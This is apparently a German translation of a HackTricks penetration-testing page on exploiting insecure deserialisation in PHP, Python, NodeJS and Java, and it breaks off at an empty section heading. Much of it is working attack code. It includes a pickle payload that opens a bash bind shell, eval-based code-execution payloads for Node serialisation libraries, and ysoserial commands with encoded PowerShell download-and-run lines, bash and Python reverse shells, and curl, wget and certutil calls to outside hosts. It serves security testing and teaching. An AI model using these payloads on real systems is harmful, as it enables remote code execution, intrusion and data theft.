# Deserialisierung

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>


## Grundlegende Informationen

**Serialisierung** wird als die Methode verstanden, ein Objekt in ein Format umzuwandeln, das erhalten bleiben kann, mit dem Ziel, das Objekt entweder zu speichern oder im Rahmen eines Kommunikationsprozesses zu √ºbertragen. Diese Technik wird h√§ufig eingesetzt, um sicherzustellen, dass das Objekt zu einem sp√§teren Zeitpunkt wiederhergestellt werden kann, wobei seine Struktur und sein Zustand erhalten bleiben.

**Deserialisierung** hingegen ist der Prozess, der der Serialisierung entgegenwirkt. Dabei wird strukturierte Daten in einem bestimmten Format genommen und wieder in ein Objekt umgewandelt.

Deserialisierung kann gef√§hrlich sein, da sie potenziell **Angreifern erm√∂glicht, die serialisierten Daten zu manipulieren, um sch√§dlichen Code auszuf√ºhren** oder unerwartetes Verhalten in der Anwendung w√§hrend des Objektwiederherstellungsprozesses zu verursachen.


## PHP

In PHP werden spezielle magische Methoden w√§hrend der Serialisierungs- und Deserialisierungsprozesse verwendet:

* `__sleep`: Wird aufgerufen, wenn ein Objekt serialisiert wird. Diese Methode sollte ein Array mit den Namen aller Eigenschaften des Objekts zur√ºckgeben, die serialisiert werden sollen. Sie wird h√§ufig verwendet, um ausstehende Daten zu √ºbertragen oder √§hnliche Aufr√§umarbeiten durchzuf√ºhren.
* `__wakeup`: Wird aufgerufen, wenn ein Objekt deserialisiert wird. Sie wird verwendet, um verlorene Datenbankverbindungen w√§hrend der Serialisierung wiederherzustellen und andere Initialisierungsaufgaben durchzuf√ºhren.
* `__unserialize`: Diese Methode wird anstelle von `__wakeup` aufgerufen (sofern vorhanden), wenn ein Objekt deserialisiert wird. Sie bietet mehr Kontrolle √ºber den Deserialisierungsprozess im Vergleich zu `__wakeup`.
* `__destruct`: Diese Methode wird aufgerufen, wenn ein Objekt kurz vor der Zerst√∂rung steht oder wenn das Skript endet. Sie wird normalerweise f√ºr Aufr√§umarbeiten verwendet, wie das Schlie√üen von Dateihandles oder Datenbankverbindungen.
* `__toString`: Diese Methode erm√∂glicht es, ein Objekt als Zeichenkette zu behandeln. Sie kann zum Lesen einer Datei oder f√ºr andere Aufgaben basierend auf den darin enthaltenen Funktionsaufrufen verwendet werden und liefert effektiv eine textuelle Darstellung des Objekts.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Wenn Sie sich die Ergebnisse ansehen, k√∂nnen Sie sehen, dass die Funktionen **`__wakeup`** und **`__destruct`** aufgerufen werden, wenn das Objekt deserialisiert wird. Beachten Sie, dass in mehreren Tutorials steht, dass die Funktion **`__toString`** aufgerufen wird, wenn versucht wird, ein Attribut zu drucken, aber anscheinend passiert das **nicht mehr**.

{% hint style="warning" %}
Die Methode **`__unserialize(array $data)`** wird **anstelle von `__wakeup()`** aufgerufen, wenn sie in der Klasse implementiert ist. Sie erm√∂glicht es Ihnen, das Objekt zu deserialisieren, indem Sie die serialisierten Daten als Array bereitstellen. Sie k√∂nnen diese Methode verwenden, um Eigenschaften zu deserialisieren und alle erforderlichen Aufgaben bei der Deserialisierung durchzuf√ºhren.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

Sie k√∂nnen ein erkl√§rtes **PHP-Beispiel hier lesen**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), hier [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) oder hier [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

Sie k√∂nnen die PHP-Autoload-Funktionalit√§t missbrauchen, um beliebige PHP-Dateien und mehr zu laden:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Serialisierung von referenzierten Werten

Wenn Sie aus irgendeinem Grund einen Wert als **Referenz auf einen anderen serialisierten Wert** serialisieren m√∂chten, k√∂nnen Sie dies tun:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial f√ºr PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) kann Ihnen dabei helfen, Payloads zu generieren, um PHP-Deserialisierungen zu missbrauchen.\
Beachten Sie, dass Sie in mehreren F√§llen **keine M√∂glichkeit finden werden, eine Deserialisierung im Quellcode** der Anwendung zu missbrauchen, aber Sie m√∂glicherweise in der Lage sind, den Code von externen PHP-Erweiterungen zu missbrauchen.\
√úberpr√ºfen Sie daher, wenn m√∂glich, die `phpinfo()` des Servers und **suchen Sie im Internet** (sogar in den **Gadgets** von **PHPGGC**) nach m√∂glichen Gadgets, die Sie missbrauchen k√∂nnten.

### phar:// Metadaten-Deserialisierung

Wenn Sie eine LFI gefunden haben, die nur die Datei liest und den darin enthaltenen PHP-Code nicht ausf√ºhrt, zum Beispiel mit Funktionen wie _**file\_get\_contents(), fopen(), file() oder file\_exists(), md5\_file(), filemtime() oder filesize()**_**.** Sie k√∂nnen versuchen, eine **Deserialisierung** zu missbrauchen, die beim **Lesen** einer **Datei** mit dem **phar**-Protokoll auftritt.\
Weitere Informationen finden Sie in folgendem Beitrag:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Wenn das Objekt unpickled wird, wird die Funktion _\_\_reduce\_\__ ausgef√ºhrt.\
Wenn ausgenutzt, k√∂nnte der Server einen Fehler zur√ºckgeben.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
F√ºr weitere Informationen zum Ausbruch aus **Pickle-Gef√§ngnissen** siehe:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

Die folgende Seite stellt die Technik vor, eine unsichere Deserialisierung in Python-Bibliotheken f√ºr yamls zu **missbrauchen** und schlie√üt mit einem Tool ab, das verwendet werden kann, um RCE-Deserialisierungspayloads f√ºr **Pickle, PyYAML, jsonpickle und ruamel.yaml** zu generieren:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Klassenverschmutzung (Python-Prototypenverschmutzung)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS-Magiefunktionen

JS hat keine "magischen" Funktionen wie PHP oder Python, die nur zur Erstellung eines Objekts ausgef√ºhrt werden. Aber es gibt einige Funktionen, die h√§ufig verwendet werden, auch ohne sie direkt aufzurufen, wie **`toString`**, **`valueOf`**, **`toJSON`**.\
Wenn Sie eine Deserialisierung missbrauchen, k√∂nnen Sie diese Funktionen **kompromittieren, um anderen Code auszuf√ºhren** (potenziell durch Ausnutzung von Prototypenverschmutzungen), und Sie k√∂nnten beliebigen Code ausf√ºhren, wenn sie aufgerufen werden.

Eine weitere **"magische" M√∂glichkeit, eine Funktion aufzurufen**, ohne sie direkt aufzurufen, besteht darin, ein Objekt zu **kompromittieren, das von einer asynchronen Funktion** (Promise) zur√ºckgegeben wird. Denn wenn Sie dieses **R√ºckgabeobjekt** in ein anderes **Promise** mit einer **Eigenschaft** namens **"then" vom Typ Funktion** umwandeln, wird es **ausgef√ºhrt**, nur weil es von einem anderen Promise zur√ºckgegeben wird. _Folgen Sie_ [_**diesem Link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _f√ºr weitere Informationen._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` und `prototype`-Vergiftung

Wenn Sie mehr √ºber diese Technik erfahren m√∂chten, **schauen Sie sich das folgende Tutorial an**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Diese Bibliothek erm√∂glicht die Serialisierung von Funktionen. Beispiel:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
Das **serialisierte Objekt** sieht wie folgt aus:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Im Beispiel sehen Sie, dass beim Serialisieren einer Funktion die Flagge `_$$ND_FUNC$$_` dem serialisierten Objekt angeh√§ngt wird.

In der Datei `node-serialize/lib/serialize.js` finden Sie dieselbe Flagge und wie der Code sie verwendet.

![](<../../.gitbook/assets/image (297).png>)

![](<../../.gitbook/assets/image (298).png>)

Wie Sie im letzten Code-Abschnitt sehen k√∂nnen, wird **wenn die Flagge gefunden wird** `eval` verwendet, um die Funktion zu deserialisieren, sodass im Grunde genommen **Benutzereingaben innerhalb der `eval`-Funktion verwendet werden**.

Jedoch wird **nur das Serialisieren** einer Funktion **sie nicht ausf√ºhren**, da es notwendig w√§re, dass ein Teil des Codes in unserem Beispiel `y.rce` aufruft, und das ist √§u√üerst **unwahrscheinlich**.\
Wie auch immer, Sie k√∂nnten einfach das **serialisierte Objekt modifizieren**, indem Sie einige Klammern hinzuf√ºgen, um die serialisierte Funktion automatisch auszuf√ºhren, wenn das Objekt deserialisiert wird.\
Im n√§chsten Code-Abschnitt **beachten Sie die letzten Klammern** und wie die Funktion `unserialize` den Code automatisch ausf√ºhren wird:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Wie zuvor angegeben, wird diese Bibliothek den Code nach `_$$ND_FUNC$$_` erhalten und ihn mit `eval` **ausf√ºhren**. Um also **Code automatisch auszuf√ºhren**, k√∂nnen Sie den Teil der Funktionsdefinition und die letzte Klammer l√∂schen und einfach einen JS-Einzeller ausf√ºhren, wie im folgenden Beispiel:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
Sie k√∂nnen [**hier**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **weitere Informationen** dar√ºber finden, wie Sie diese Schwachstelle ausnutzen k√∂nnen.

### [funcster](https://www.npmjs.com/package/funcster)

Ein bemerkenswerter Aspekt von **funcster** ist die Unzug√§nglichkeit von **Standard-Built-in-Objekten**; sie fallen au√üerhalb des zug√§nglichen Bereichs. Diese Einschr√§nkung verhindert die Ausf√ºhrung von Code, der versucht, Methoden auf eingebauten Objekten aufzurufen, was zu Ausnahmen wie `"ReferenceError: console is not defined"` f√ºhrt, wenn Befehle wie `console.log()` oder `require(something)` verwendet werden.

Trotz dieser Einschr√§nkung ist es m√∂glich, den vollen Zugriff auf den globalen Kontext, einschlie√ülich aller Standard-Built-in-Objekte, durch einen spezifischen Ansatz wiederherzustellen. Durch direkte Nutzung des globalen Kontexts kann diese Einschr√§nkung umgangen werden. Zum Beispiel kann der Zugriff mithilfe des folgenden Snippets wiederhergestellt werden:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**F√ºr**[ **weitere Informationen lesen Sie diese Quelle**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Das **serialize-javascript**-Paket ist ausschlie√ülich f√ºr Serialisierungszwecke konzipiert und verf√ºgt √ºber keine integrierten Deserialisierungsfunktionen. Benutzer sind daf√ºr verantwortlich, ihre eigene Methode zur Deserialisierung zu implementieren. In dem offiziellen Beispiel zur Deserialisierung von serialisierten Daten wird die direkte Verwendung von `eval` vorgeschlagen:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
Wenn diese Funktion zum Deserialisieren von Objekten verwendet wird, k√∂nnen Sie sie **einfach ausnutzen**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**F√ºr**[ **weitere Informationen lesen Sie diese Quelle**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo-Bibliothek

Auf den folgenden Seiten finden Sie Informationen dar√ºber, wie Sie diese Bibliothek missbrauchen k√∂nnen, um beliebige Befehle auszuf√ºhren:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

In Java werden **Deserialisierungs-Callbacks w√§hrend des Deserialisierungsprozesses ausgef√ºhrt**. Diese Ausf√ºhrung kann von Angreifern ausgenutzt werden, die b√∂sartige Payloads erstellen, die diese Callbacks ausl√∂sen und potenziell sch√§dliche Aktionen ausf√ºhren.

### Fingerabdr√ºcke

#### White Box

Um potenzielle Deserialisierungs-Schwachstellen im Code zu identifizieren, suchen Sie nach:

* Klassen, die das `Serializable`-Interface implementieren.
* Verwendung von `java.io.ObjectInputStream`, `readObject`, `readUnshare`-Funktionen.

Achten Sie besonders auf:

* `XMLDecoder`, der mit von externen Benutzern definierten Parametern verwendet wird.
* `XStream`'s `fromXML`-Methode, insbesondere wenn die XStream-Version kleiner oder gleich 1.46 ist, da sie anf√§llig f√ºr Serialisierungsprobleme ist.
* `ObjectInputStream` in Verbindung mit der `readObject`-Methode.
* Implementierung von Methoden wie `readObject`, `readObjectNodData`, `readResolve` oder `readExternal`.
* `ObjectInputStream.readUnshared`.
* Allgemeine Verwendung von `Serializable`.

#### Black Box

F√ºr Black-Box-Tests suchen Sie nach spezifischen **Signaturen oder "Magic Bytes"**, die auf Java-serialisierte Objekte hinweisen (ausgehend von `ObjectInputStream`):

* Hexadezimales Muster: `AC ED 00 05`.
* Base64-Muster: `rO0`.
* HTTP-Antwortheader mit `Content-Type` auf `application/x-java-serialized-object` gesetzt.
* Hexadezimales Muster, das auf vorherige Komprimierung hinweist: `1F 8B 08 00`.
* Base64-Muster, das auf vorherige Komprimierung hinweist: `H4sIA`.
* Webdateien mit der Erweiterung `.faces` und dem Parameter `faces.ViewState`. Das Entdecken dieser Muster in einer Webanwendung sollte zu einer Untersuchung f√ºhren, wie in dem [Beitrag √ºber Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md) detailliert beschrieben.
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### √úberpr√ºfen Sie, ob verwundbar

Wenn Sie mehr √ºber die Funktionsweise eines Java Deserialisierungsangriffs erfahren m√∂chten, sollten Sie sich [**Grundlegende Java Deserialisierung**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserialisierung**](java-dns-deserialization-and-gadgetprobe.md) und [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md) ansehen.

#### White-Box-Test

Sie k√∂nnen √ºberpr√ºfen, ob eine Anwendung mit bekannten Sicherheitsl√ºcken installiert ist.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Sie k√∂nnten versuchen, **alle bekannten anf√§lligen Bibliotheken** zu √ºberpr√ºfen, f√ºr die [**Ysoserial**](https://github.com/frohoff/ysoserial) einen Exploit bereitstellen kann. Oder Sie k√∂nnten die Bibliotheken √ºberpr√ºfen, die auf [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json) angegeben sind.\
Sie k√∂nnen auch [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) verwenden, um nach m√∂glichen Gadget-Ketten zu suchen, die ausgenutzt werden k√∂nnen.\
Wenn Sie **gadgetinspector** ausf√ºhren (nachdem Sie es erstellt haben), k√ºmmern Sie sich nicht um die vielen Warnungen/Fehler, die angezeigt werden, und lassen Sie es fertig werden. Es schreibt alle Ergebnisse unter _gadgetinspector/gadget-results/gadget-chains-Jahr-Monat-Tag-Stunde-Minute.txt_. Beachten Sie bitte, dass **gadgetinspector keinen Exploit erstellt und m√∂glicherweise falsche positive Ergebnisse anzeigt**.

#### Black Box Test

Mit der Burp-Erweiterung [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) k√∂nnen Sie feststellen, **welche Bibliotheken verf√ºgbar sind** (und sogar die Versionen). Mit diesen Informationen k√∂nnte es **einfacher sein, eine Payload auszuw√§hlen**, um die Schwachstelle auszunutzen.\
[**Lesen Sie hier mehr √ºber GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe konzentriert sich auf **`ObjectInputStream`-Deserialisierungen**.

Mit der Burp-Erweiterung [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) k√∂nnen Sie **anf√§llige Bibliotheken identifizieren**, die mit ysoserial ausgenutzt werden k√∂nnen, und sie **ausnutzen**.\
[**Lesen Sie hier mehr √ºber den Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Der Java Deserialization Scanner konzentriert sich auf **`ObjectInputStream`**-Deserialisierungen.

Sie k√∂nnen auch [**Freddy**](https://github.com/nccgroup/freddy) verwenden, um Deserialisierungs-Schwachstellen in **Burp** zu erkennen. Dieses Plugin erkennt Schwachstellen, die nicht nur mit **`ObjectInputStream`** zusammenh√§ngen, sondern auch mit Deserialisierungs-Bibliotheken f√ºr **Json** und **Yml**. Im aktiven Modus versucht es, diese Schwachstellen mit Sleep- oder DNS-Payloads zu best√§tigen.\
[**Weitere Informationen zu Freddy finden Sie hier.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Serialization Test**

Es geht nicht nur darum, zu √ºberpr√ºfen, ob der Server eine anf√§llige Bibliothek verwendet. Manchmal k√∂nnen Sie in der Lage sein, die Daten innerhalb des serialisierten Objekts zu √§ndern und einige √úberpr√ºfungen zu umgehen (vielleicht erhalten Sie Administratorrechte in einer Webanwendung).\
Wenn Sie ein in Java serialisiertes Objekt finden, das an eine Webanwendung gesendet wird, k√∂nnen Sie [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) verwenden, um das serialisierte Objekt in einem menschenlesbaren Format auszugeben. Wenn Sie wissen, welche Daten Sie senden, ist es einfacher, sie zu √§ndern und einige √úberpr√ºfungen zu umgehen.

### **Exploit**

#### **ysoserial**

Das Hauptwerkzeug zum Ausnutzen von Java-Deserialisierungen ist [**ysoserial**](https://github.com/frohoff/ysoserial) ([**hier herunterladen**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Sie k√∂nnen auch in Betracht ziehen, [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) zu verwenden, mit dem Sie komplexe Befehle (mit Pipes zum Beispiel) verwenden k√∂nnen.\
Beachten Sie, dass dieses Tool sich auf die Ausnutzung von **`ObjectInputStream`** konzentriert.\
Ich w√ºrde damit beginnen, die Payload "URLDNS" zu verwenden, **bevor ich eine RCE-Payload** verwende, um zu testen, ob die Injektion m√∂glich ist. Beachten Sie jedoch, dass die Payload "URLDNS" m√∂glicherweise nicht funktioniert, aber eine andere RCE-Payload funktioniert.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Bei der Erstellung eines Payloads f√ºr **java.lang.Runtime.exec()** k√∂nnen **keine Sonderzeichen** wie ">" oder "|" verwendet werden, um die Ausgabe einer Ausf√ºhrung umzuleiten, "$()" um Befehle auszuf√ºhren oder sogar **Argumente** an einen Befehl zu √ºbergeben, die durch **Leerzeichen** getrennt sind (Sie k√∂nnen `echo -n "hello world"` machen, aber Sie k√∂nnen nicht `python2 -c 'print "Hello world"'` machen). Um den Payload korrekt zu kodieren, k√∂nnen Sie [diese Webseite](http://www.jackson-t.ca/runtime-exec-payloads.html) verwenden.

Verwenden Sie gerne das folgende Skript, um **alle m√∂glichen Codeausf√ºhrungs**-Payloads f√ºr Windows und Linux zu erstellen und dann auf der verwundbaren Webseite zu testen:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### SerialKillerBypassGadgets

